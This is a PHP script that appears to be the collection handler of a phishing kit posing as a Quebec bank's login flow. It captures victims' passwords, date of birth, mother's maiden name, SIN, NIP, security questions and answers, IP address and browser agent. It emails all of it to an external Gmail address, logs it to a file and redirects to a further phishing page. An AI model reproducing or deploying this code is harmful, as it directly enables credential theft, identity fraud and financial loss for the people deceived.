<?php
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");
$dd = $_POST['jourNaissance'];
$mm = $_POST['moisNaissance'];
$yy = $_POST['anneeNaissance'];
$q1 = $_POST['q1'];
$a1 = $_POST['a1'];
$q2 = $_POST['q2'];
$a2 = $_POST['a2'];
$q3 = $_POST['q3'];
$a3 = $_POST['a3'];
$mmn = $_POST['mmn'];
$sin = $_POST['ssn'];
$nip = $_POST['compte'];
$name = $_POST['nom'];
$pass = $_POST['pass'];
$nip = $_POST['nip'];
$data ="
=============## DESJ ##==================
|PASS : $pass
=============##=============##=============##
|DoB : $dd,$mm,$yy
|MMN : $mmn
|SIN : $sin
|NIP : $nip
=============================================
Q1: $q1
A1: $a1
-
Q2: $q2
A2: $a2
-
Q3: $q3
A3: $a3
============## Goodies ##=======================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##DEJ #$browserAgent";

$emailusr = 'results1113@gmail.com';

mail($emailusr, $subj, $data);

 $fp = fopen("logs.txt", "a");
 //write to the file
 fwrite($fp, $data);
 fclose($fp);

header("Location: ./questions.php");

?>